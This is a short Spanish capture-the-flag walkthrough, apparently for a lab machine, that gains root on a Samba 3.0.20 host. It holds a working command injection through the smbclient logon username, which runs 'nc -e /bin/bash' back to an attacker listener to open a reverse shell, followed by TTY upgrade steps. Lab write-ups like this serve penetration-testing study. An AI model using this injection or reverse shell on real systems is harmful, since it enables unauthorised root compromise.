## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la vulnerabilidad SAMBA 3.0.20 {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Intentamos enviar commandos siguiendo la guia del script

    ```bash
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.7 443`"'
    ```

Hemos ganado accesso al systema.


### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `whoami` vemos que ya estamos root ;) No se necessita escalar privilegios en este caso.
